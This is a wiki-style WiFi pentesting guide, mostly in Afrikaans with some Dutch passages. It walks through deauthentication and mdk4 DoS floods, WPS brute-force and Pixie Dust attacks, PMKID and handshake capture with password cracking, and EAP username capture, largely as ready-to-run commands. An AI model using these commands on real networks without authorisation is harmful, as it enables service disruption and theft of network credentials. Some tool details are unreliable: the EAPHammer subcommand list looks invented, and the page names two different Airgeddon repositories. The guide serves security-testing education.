# Pentesting Wifi

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutjagters!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack-nuus**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van real-time nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutjagbounties wat begin en belangrike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Wifi basiese bevele
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
### EAPHammer

EAPHammer is 'n kragtige hulpmiddel wat gebruik kan word vir aanvalle op WiFi-netwerke wat gebruik maak van EAP (Extensible Authentication Protocol). Hierdie hulpmiddel maak gebruik van 'n verskeidenheid van aanvalstegnieke om die veiligheid van die WiFi-netwerk te toets en te omseil.

#### Installasie

Om EAPHammer te installeer, volg die volgende stappe:

1. Kloon die EAPHammer-bediener vanaf die GitHub-bewaarplek:

   ```
   git clone https://github.com/s0lst1c3/eaphammer.git
   ```

2. Navigeer na die EAPHammer-bediener se hoofmap:

   ```
   cd eaphammer
   ```

3. Voer die installasieskripsie uit om die nodige afhanklikhede te installeer:

   ```
   sudo ./kali-setup
   ```

4. Na die installasie kan jy EAPHammer begin gebruik deur die volgende opdrag uit te voer:

   ```
   sudo python3 eaphammer.py
   ```

#### Gebruik

EAPHammer kan gebruik word om verskeie aanvalle op WiFi-netwerke uit te voer. Hier is 'n paar voorbeelde van die opdragte wat jy kan gebruik:

- `list` - Lys beskikbare WiFi-netwerke in jou omgewing.
- `target <SSID>` - Kies 'n spesifieke WiFi-netwerk om aan te val.
- `deauth` - Stuur deauth-pakette na die gekose WiFi-netwerk om kli√´nte te ontwrig.
- `creds` - Probeer om inloglegitimasie van kli√´nte te onderskep.
- `inject` - Voeg valse inlogvorme by om kli√´nte se inloglegitimasie te onderskep.

Vir meer inligting oor die gebruik van EAPHammer, raadpleeg die [offisi√´le dokumentasie](https://github.com/s0lst1c3/eaphammer).
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon is 'n kragtige hulpmiddel vir WiFi-pentesting wat ontwerp is om jou te help met die uitvoer van verskeie aanvalle op draadlose netwerke. Dit bied 'n verskeidenheid van funksies en tegnieke wat jou in staat stel om die veiligheid van WiFi-netwerke te ondersoek en te toets.

#### Kenmerke

- **WPS-aanvalle**: Airgeddon ondersteun verskeie WPS-aanvalle, insluitend die Brute-Force-metode en die Pixie Dust-aanval.
- **Evil Twin**: Hierdie funksie maak dit moontlik om 'n kwaadwillige draadlose toegangspunt te skep wat lyk soos 'n legitieme netwerk, om gebruikers te mislei om daarmee te verbind.
- **Deauth-aanvalle**: Airgeddon maak dit maklik om deauth-aanvalle uit te voer, wat die verbindings van gebruikers met 'n WiFi-netwerk kan onderbreek.
- **Handshake-aanvalle**: Hierdie hulpmiddel bied verskeie metodes om handshakes van WiFi-netwerke te onderskep en te ontsleutel.
- **WPA/WPA2-aanvalle**: Airgeddon ondersteun verskeie aanvalle op WPA- en WPA2-beveiligde netwerke, insluitend die gebruik van woordelys- en brute force-aanvalle.
- **Netwerkmonitoring**: Met Airgeddon kan jy die aktiwiteit van draadlose netwerke monitor en inligting soos MAC-adresse, SSID's en kanaalgebruik bekom.
- **Gebruikersinteraksie**: Die hulpmiddel bied 'n gebruikersvriendelike koppelvlak wat jou in staat stel om die aanvalle te konfigureer en te bestuur.

#### Gebruik

Om Airgeddon te gebruik, moet jy dit installeer op 'n Linux-gebaseerde stelsel. Jy kan die bronkode aflaai van die amanecer/Airgeddon GitHub-bewaarplek en die hulpmiddel hardloop deur die `./airgeddon.sh`-skripsie uit te voer.

> Let daarop dat die gebruik van Airgeddon om enige vorm van onwettige aktiwiteite uit te voer streng verbode is. Dit moet slegs gebruik word vir wettige doeleindes, soos die toets van die veiligheid van jou eie WiFi-netwerk of met toestemming van die eienaar van die netwerk wat jy toets.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Voer airgeddon uit met docker**

Om airgeddon uit te voeren met behulp van Docker, volg je de onderstaande stappen:

1. Zorg ervoor dat Docker op je systeem is ge√Ønstalleerd en correct is geconfigureerd.

2. Open een terminalvenster en navigeer naar de map waarin je airgeddon wilt uitvoeren.

3. Maak een nieuw bestand genaamd `Dockerfile` en open het met een teksteditor.

4. Voeg de volgende regels toe aan het `Dockerfile`-bestand:

   ```dockerfile
   FROM kalilinux/kali-rolling
   RUN apt-get update && apt-get install -y aircrack-ng wireless-tools
   RUN git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
   WORKDIR /airgeddon
   ENTRYPOINT ["./airgeddon.sh"]
   ```

5. Sla het `Dockerfile`-bestand op en sluit de teksteditor.

6. Bouw de Docker-image met het volgende commando:

   ```bash
   docker build -t airgeddon .
   ```

7. Wacht tot het bouwproces is voltooid. Dit kan enige tijd duren, afhankelijk van je internetverbindingssnelheid.

8. Nadat de Docker-image is gebouwd, voer je het volgende commando uit om airgeddon in een Docker-container uit te voeren:

   ```bash
   docker run -it --net=host --privileged airgeddon
   ```

   Hiermee wordt een interactieve terminalsessie gestart waarin airgeddon wordt uitgevoerd.

9. Volg de instructies op het scherm om airgeddon te configureren en te gebruiken voor het pentesten van wifi-netwerken.

Opmerking: Zorg ervoor dat je de juiste machtigingen hebt om Docker-opdrachten uit te voeren en dat je de nodige voorzorgsmaatregelen neemt bij het uitvoeren van pentestactiviteiten.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Vanaf: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Dit kan Evil Twin, KARMA en Bekende Beacons aanvalle uitvoer en dan 'n hengel sjabloon gebruik om die werklike wagwoord van die netwerk te verkry of sosiale netwerk geloofsbriewe vas te vang.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Hierdie instrument outomatiseer **WPS/WEP/WPA-PSK** aanvalle. Dit sal outomaties:

* Die koppelvlak in monitormodus stel
* Skandeer vir moontlike netwerke - En laat jou die slagoffer(s) kies
* As WEP - WEP aanvalle loods
* As WPA-PSK
* As WPS: Pixie dust aanval en die brute force aanval (wees versigtig, die brute force aanval kan 'n lang tyd neem). Let daarop dat dit nie nul PIN of databasis/ gegenereerde PINs probeer nie.
* Probeer om die PMKID van die AP vas te vang om dit te kraak
* Probeer om kli√´nte van die AP te deautentiseer om 'n handshake vas te vang
* As PMKID of Handshake, probeer om dit te kraak deur die top5000 wagwoorde te gebruik.

## Aanvalle Opsomming

* **DoS**
* Deautentisering/ontbinding - Ontkoppel almal (of 'n spesifieke ESSID/Kli√´nt)
* Willekeurige valse AP's - Versteek netwerke, moontlike skanderingstoestelle laat vasloop
* Oorlading AP - Probeer om die AP te vernietig (gewoonlik nie baie nuttig nie)
* WIDS - Speel met die IDS
* TKIP, EAPOL - Sekere spesifieke aanvalle om sommige AP's te DoS
* **Kraak**
* Kraak **WEP** (verskeie instrumente en metodes)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute force
* \[DoS +] **WPA handshake** vasvang + Kraak
* **WPA-MGT**
* **Gebruikersnaam vasvang**
* **Brute force** Legitieme inligting
* **Evil Twin** (met of sonder DoS)
* **Oop** Evil Twin \[+ DoS] - Nuttig om gevangene portaallegitieme inligting vas te vang en/of LAN aanvalle uit te voer
* **WPA-PSK** Evil Twin - Nuttig vir netwerkaanvalle as jy die wagwoord weet
* **WPA-MGT** - Nuttig om maatskappylegitieme inligting vas te vang
* **KARMA, MANA**, **Loud MANA**, **Bekende baken**
* **+ Oop** - Nuttig om gevangene portaallegitieme inligting vas te vang en/of LAN aanvalle uit te voer
* **+ WPA** - Nuttig om WPA handshakes vas te vang

## DOS

### Deautentiseringspakkette

**Beskrywing van** [**hier**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deautentisering** aanvalle, 'n algemene metode in Wi-Fi-hacking, behels die vervalsing van "bestuurs" raamwerke om toestelle kragtig van 'n netwerk af te koppel. Hierdie onversleutelde pakkette mislei kli√´nte om te glo dat hulle van die regmatige netwerk afkomstig is, wat aanvallers in staat stel om WPA handshakes vir kraakdoeleindes te versamel of om volgehoue netwerkverbindings te ontwrig. Hierdie taktiek, verontrustend in sy eenvoud, word wyd gebruik en het beduidende implikasies vir netwerksekuriteit.

**Deautentisering met behulp van Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 beteken deautentifikasie
* 1 is die aantal deautentifikasies wat gestuur moet word (jy kan meerdere stuur as jy wil); 0 beteken stuur hulle voortdurend
* \-a 00:14:6C:7E:40:80 is die MAC-adres van die toegangspunt
* \-c 00:0F:B5:34:30:30 is die MAC-adres van die kli√´nt wat gedeauteer moet word; as dit weggelaat word, word 'n uitsaai-deautentifikasie gestuur (werk nie altyd nie)
* ath0 is die interfacenaam

### Ontbindingpakkette

**Ontbindingpakkette**, soortgelyk aan deautentifikasiepakkette, is 'n tipe bestuursraamwerk wat in Wi-Fi-netwerke gebruik word. Hierdie pakkette dien om die verbinding tussen 'n toestel (soos 'n draagbare rekenaar of slimfoon) en 'n toegangspunt (AP) te verbreek. Die prim√™re onderskeid tussen ontbinding en deautentifikasie l√™ in hul gebruiksscenario's. Terwyl 'n AP **deautentifikasiepakkette uitsaai om duidelik valse toestelle uit die netwerk te verwyder, word ontbindingpakkette tipies gestuur wanneer die AP afgeskakel, herlaai of verskuif word, en dus die ontkoppeling van alle gekoppelde knooppunte vereis**.

**Hierdie aanval kan uitgevoer word deur mdk4 (modus "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Meer DOS-aanvalle deur mdk4**

**Hierdie** [**skakel**](https://en.kali.tools/?p=864)**.**

**AANVALMODUS b: Beacon-oorstroming**

Stuur seinrame om valse toegangspunte aan kli√´nte te wys. Dit kan soms netwerk-skandeerders en selfs drywers laat vasloop!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**AANVALSMODUS a: Verifikasie Weiering-Van-Diens**

Deur verifikasie raamwerke na alle toeganklike Toegangspunte (AP's) binne bereik te stuur, kan hierdie AP's oorlaai word, veral wanneer daar baie kli√´nte betrokke is. Hierdie intense verkeer kan lei tot sisteem-onstabiliteit, wat veroorsaak dat sommige AP's vries of selfs herstel.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**AANVALSMODUS p: SSID Probing en Bruteforcing**

Probing Access Points (AP's) kontroleer of 'n SSID behoorlik onthul word en bevestig die AP se reikafstand. Hierdie tegniek, gekoppel met **bruteforcing van verborge SSID's** met of sonder 'n woordelys, help om verskuilde netwerke te identifiseer en toegang daartoe te verkry.

**AANVALSMODUS m: Michael Countermeasures Uitbuiting**

Die stuur van lukrake of duplikaat pakkies na verskillende QoS-rye kan Michael Countermeasures op **TKIP AP's** teweegbring, wat lei tot 'n een-minuut AP-afsluiting. Hierdie metode is 'n doeltreffende **DoS** (Denial of Service) aanvalstaktiek.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**AANVALSMODUS e: EAPOL Begin en Logoff Pakketinspuiting**

De AP overspoelen met **EAPOL Begin frames** skep **vals sessies**, wat die AP oorweldig en legitieme kli√´nte blokkeer. Alternatiewelik, deur **vals EAPOL Logoff-boodskappe** in te spuit, word kli√´nte kragdadig afgekoppel. Beide metodes versteur effektief netwerkdienste.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**AANVALSMODUS s: Aanvalle vir IEEE 802.11s masnetwerke**

Verskeie aanvalle op skakelbestuur en roetebepaling in masnetwerke.

**AANVALSMODUS w: WIDS Verwarring**

Kruisverbindende kli√´nte na verskeie WDS-nodes of valse skelm AP's kan Intrusion Detection en Prevention Systems manipuleer, verwarring skep en potensi√´le stelselmisbruik veroorsaak.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**AANVALSMODUS f: Pakket Fuzzer**

'n Pakket Fuzzer met diverse pakketsbronne en 'n omvattende stel veranderlikes vir pakketsmanipulasie.

### **Airggedon**

_**Airgeddon**_ bied die meeste van die aanvalle wat voorgestel is in die vorige kommentaar:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereenvoudig die proses om toestelle aan 'n router te koppel, verbeter die opstellingspoed en gemak vir netwerke wat versleutel is met **WPA** of **WPA2** Persoonlik. Dit is ondoeltreffend vir die maklik gekompromitteerde WEP-sekuriteit. WPS maak gebruik van 'n 8-syfer PIN, wat in twee helftes geverifieer word, en dit maak dit vatbaar vir brute force-aanvalle as gevolg van die beperkte aantal kombinasies (11,000 moontlikhede).

### WPS Brute Force

Daar is 2 hoofgereedskap om hierdie aksie uit te voer: Reaver en Bully.

* **Reaver** is ontwerp om 'n robuuste en praktiese aanval teen WPS te wees, en is getoets teen 'n wye verskeidenheid toegangspunte en WPS-implementasies.
* **Bully** is 'n **nuwe implementasie** van die WPS brute force-aanval, geskryf in C. Dit het verskeie voordele bo die oorspronklike reaver-kode: minder afhanklikhede, verbeterde geheue- en CPU-prestasie, korrekte hantering van endianness, en 'n meer robuuste stel opsies.

Die aanval maak gebruik van die **kwesbaarheid van die WPS PIN**, veral die blootstelling van die eerste vier syfers en die rol van die laaste syfer as 'n kontrolesom, wat die brute force-aanval vergemaklik. Tog vereis verdedigings teen brute force-aanvalle, soos **blokkering van MAC-adresse** van aggressiewe aanvallers, **MAC-adresrotasie** om die aanval voort te sit.

Nadat die WPS PIN verkry is met gereedskap soos Bully of Reaver, kan die aanvaller die WPA/WPA2 PSK aflei, wat **volgehoue netwerktoegang** verseker.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Slim Brute Force**

Hierdie verfynde benadering teiken WPS PINs deur bekende kwesbaarhede te gebruik:

1. **Vooraf ontdekte PINs**: Maak gebruik van 'n databasis van bekende PINs wat gekoppel is aan spesifieke vervaardigers wat bekende WPS PINs gebruik. Hierdie databasis korreleer die eerste drie oktette van MAC-adresse met waarskynlike PINs vir hierdie vervaardigers.
2. **PIN-generasie-algoritmes**: Maak gebruik van algoritmes soos ComputePIN en EasyBox, wat WPS PINs bereken op grond van die AP se MAC-adres. Die Arcadyan-algoritme vereis ook 'n toestel-ID, wat 'n laag tot die PIN-generasieproses byvoeg.

### WPS Pixie Dust-aanval

**Dominique Bongard** het 'n fout ontdek in sommige Toegangspunte (AP's) met betrekking tot die skep van geheime kodes, bekend as **nonces** (**E-S1** en **E-S2**). As hierdie nonces uitgewerk kan word, word dit maklik om die AP se WPS PIN te kraak. Die AP openbaar die PIN binne 'n spesiale kode (hash) om te bewys dat dit legitiem is en nie 'n valse (rogue) AP is nie. Hierdie nonces is in wese die "sleutels" om die "kluis" wat die WPS PIN bevat, te ontsluit. Meer hieroor kan hier gevind word [here](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

In eenvoudige terme is die probleem dat sommige AP's nie genoegsaam willekeurige sleutels gebruik het om die PIN tydens die verbindingsproses te enkripteer nie. Dit maak die PIN vatbaar om van buite die netwerk geradeer te word (offline brute force-aanval).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Null Pin-aanval

Sommige swak ontwerpte stelsels laat selfs 'n **Null PIN** (le√´ of nie-bestaande PIN) toe om toegang te verkry, wat nogal ongewoon is. Die instrument **Reaver** is in staat om hierdie kwesbaarheid te toets, in teenstelling met **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Al die voorgestelde WPS-aanvalle kan maklik uitgevoer word met _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 en 6 laat jou toe om **jou eie PIN-kode** te probeer (as jy enige het)
* 7 en 8 voer die **Pixie Dust-aanval** uit
* 13 stel jou in staat om die **NULL PIN** te toets
* 11 en 12 sal die PIN-kodes wat verband hou met die gekose AP uit beskikbare databasisse **versamel** en moontlike **PIN-kodes** genereer deur gebruik te maak van: ComputePIN, EasyBox en opsioneel Arcadyan (aanbeveel, hoekom nie?)
* 9 en 10 sal **elke moontlike PIN-kode** toets

## **WEP**

So gebreek en ongebruik deesdae. Weet net dat _**airgeddon**_ 'n WEP-opsie genaamd "All-in-One" het om hierdie tipe beskerming aan te val. Meer gereedskap bied soortgelyke opsies.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en foutjagters te kommunikeer!

**Hacking Insights**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hackering ondersoek

**Real-Time Hack News**\
Bly op hoogte van die vinnige hackeringw√™reld deur middel van nuus en insigte in werklike tyd

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutjagbounties wat begin en belangrike platformopdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

***


## WPA/WPA2 PSK

### PMKID

In 2018 het **hashcat** [onthul](https://hashcat.net/forum/thread-7717.html) 'n nuwe aanvalsmetode, uniek omdat dit slegs **een enkele pakkie** benodig en nie vereis dat enige kli√´nte met die teiken-AP verbind is nie‚Äînet interaksie tussen die aanvaller en die AP.

Baie moderne roeterysters voeg 'n **opsionele veld** by die **eerste EAPOL**-raam tydens assosiasie, bekend as `Robust Security Network`. Dit sluit die `PMKID` in.

Soos die oorspronklike pos verduidelik, word die **PMKID** geskep deur bekende data te gebruik:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Gegewe dat die "PMK Naam" konstant is, weet ons die BSSID van die AP en die stasie, en die `PMK` is identies aan di√© van 'n volledige 4-weg handskud, kan **hashcat** hierdie inligting gebruik om die PSK te kraak en die wagwoord te herstel!

Om hierdie inligting te **versamel** en plaaslik die wagwoord te **brute force**, kan jy die volgende doen:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs wat gevang is**, sal in die **konsole** vertoon word en ook **gestoor** word binne \_ **/tmp/attack.pcap**\_\
Omskep nou die vangste na **hashcat/john** formaat en kraak dit:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Let asseblief daarop dat die formaat van 'n korrekte has 'n **4 dele** bevat, soos: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
As joune **slegs 3 dele** bevat, is dit **ongeldig** (die PMKID-vangste was nie geldig nie).

Let daarop dat `hcxdumptool` ook **handskrifte vasvang** (iets soos dit sal verskyn: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Jy kan die **handskrifte** omskep na **hashcat**/**john** formaat deur `cap2hccapx` te gebruik.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ek het opgemerk dat sommige handskrifte wat met hierdie instrument vasgevang is, selfs met die korrekte wagwoord nie gekraak kon word nie. Ek sal aanbeveel om handskrifte ook op die tradisionele manier vas te vang as dit moontlik is, of om verskeie handskrifte met behulp van hierdie instrument vas te vang._

### Handskrif vasvang

'n Aanval op **WPA/WPA2**-netwerke kan uitgevoer word deur 'n **handskrif** vas te vang en te probeer om die wagwoord **aflyn** te **kraak**. Hierdie proses behels die monitering van die kommunikasie van 'n spesifieke netwerk en **BSSID** op 'n spesifieke **kanaal**. Hier is 'n gestroomlynde gids:

1. Identifiseer die **BSSID**, **kanaal**, en 'n **verbindde kli√´nt** van die teiken netwerk.
2. Gebruik `airodump-ng` om die netwerkverkeer op die gespesifiseerde kanaal en BSSID te moniteer, in die hoop om 'n handskrif vas te vang. Die opdrag sal so lyk:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Om die kans te vergroot om 'n handshake vas te vang, verbreek kortliks die verbinding met die kli√´nt van die netwerk om 'n her-autentifikasie af te dwing. Dit kan gedoen word deur die `aireplay-ng` bevel te gebruik, wat de-autentifikasie-pakette na die kli√´nt stuur:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Merk op dat as die kli√´nt gedeautentiseer is, kan dit probeer om met 'n ander AP of, in ander gevalle, met 'n ander netwerk te verbind._

Sodra daar in die `airodump-ng` 'n paar handskrifinligting verskyn, beteken dit dat die handskrif vasgevang is en jy kan ophou luister:

![](<../../.gitbook/assets/image (172) (1).png>)

Sodra die handskrif vasgevang is, kan jy dit **kraak** met `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Kontroleer of handdruk in l√™er is

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**

**tshark** is 'n kragtige hulpmiddel wat gebruik word vir die analise en ontleed van netwerkverkeer. Dit is 'n opdraggelyngebaseerde sniffer wat deel uitmaak van die Wireshark-pakket. Met **tshark** kan jy netwerkverkeer vasvang en ontleed sonder om 'n grafiese gebruikerskoppelvlak te gebruik.

Hier is 'n paar nuttige opdraglyne wat jy met **tshark** kan gebruik:

- `tshark -i <interface>`: Begin met die vasvang van netwerkverkeer op die gespesifiseerde netwerkinterface.
- `tshark -r <file>`: Ontleed 'n bestaande verkeersl√™er.
- `tshark -Y <display filter>`: Pas 'n vertoonfilter toe om spesifieke verkeer te sien.
- `tshark -T <output format>`: Stel die uitvoerformaat vir die ontleedde verkeer in, soos tekst, JSON of CSV.
- `tshark -z <statistics>`: Gee statistieke oor die vasgevang verkeer, soos protokolhi√´rargie√´ of stroominligting.

Dit is net 'n paar voorbeelde van die kragtige funksies wat **tshark** bied. Deur hierdie opdraglyne te gebruik, kan jy netwerkverkeer ontleed en waardevolle inligting verkry vir netwerkpenetreringstoetse en -analise.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_As hierdie instrument 'n onvoltooide handdruk van 'n ESSID vind voordat die voltooide een, sal dit nie die geldige een opspoor nie._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **ondernemings WiFi-opsette sal jy verskeie verifikasiemetodes te√´kom**, elk met verskillende veiligheidsvlakke en bestuurskenmerke. Wanneer jy gereedskap soos `airodump-ng` gebruik om netwerkverkeer te ondersoek, sal jy dalk identifiseerders vir hierdie verifikasiemetodes sien. Enkele algemene metodes sluit in:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Hierdie metode ondersteun hardeware tokens en eenmalige wagwoorde binne EAP-PEAP. Anders as MSCHAPv2, gebruik dit nie 'n ewekansige uitdaging nie en stuur wagwoorde in platte teks na die toegangspunt, wat 'n risiko vir afwaartse aanvalle inhou.

2. **EAP-MD5 (Message Digest 5)**:
- Behels die stuur van die MD5-hash van die wagwoord vanaf die klient. Dit word **nie aanbeveel** nie as gevolg van die kwesbaarheid vir woordeboekaanvalle, gebrek aan bedienerverifikasie en onvermo√´ om sessiespesifieke WEP-sleutels te genereer.

3. **EAP-TLS (Transport Layer Security)**:
- Maak gebruik van beide klient- en bedienersertifikate vir verifikasie en kan dinamies gebruikersgebaseerde en sessiegebaseerde WEP-sleutels genereer vir die beveiliging van kommunikasie.

4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Verskaf wederkerige verifikasie deur middel van 'n versleutelde tonnel, tesame met 'n metode om dinamiese, per-gebruiker, per-sessie WEP-sleutels af te lei. Dit vereis slegs bedienersertifikate, met kliente wat geloofsbriewe gebruik.

5. **PEAP (Protected Extensible Authentication Protocol)**:
- Werk op 'n soortgelyke manier as EAP deur 'n TLS-tonnel vir beveiligde kommunikasie te skep. Dit maak die gebruik van swakker verifikasieprotokolle bo-op EAP moontlik as gevolg van die beskerming wat deur die tonnel gebied word.
* **PEAP-MSCHAPv2**: Word dikwels na verwys as PEAP en kombineer die kwesbare MSCHAPv2-uitdaging/respons-meganisme met 'n beskermende TLS-tonnel.
* **PEAP-EAP-TLS (of PEAP-TLS)**: Soortgelyk aan EAP-TLS, maar inisieer 'n TLS-tonnel voordat sertifikate uitgeruil word, wat 'n addisionele laag van sekuriteit bied.

Meer inligting oor hierdie verifikasiemetodes is beskikbaar [hier](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) en [hier](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Gebruikersnaam Vaslegging

Deur [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) te lees, lyk dit asof as jy EAP gebruik, die "Identity"-boodskappe ondersteun moet word, en die gebruikersnaam sal in die "Response Identity"-boodskappe in die klaar gestuur word.

Selfs as jy een van die veiligste verifikasiemetodes gebruik, naamlik PEAP-EAP-TLS, is dit moontlik om die gebruikersnaam wat in die EAP-protokol gestuur word, vas te l√™. Om dit te doen, vang 'n verifikasiekommunikasie op (begin `airodump-ng` binne 'n kanaal en `wireshark` in dieselfde koppelvlak) en filtreer die pakkies volgens `eapol`.
In die "Response, Identity"-pakkie sal die gebruikersnaam van die klient verskyn.

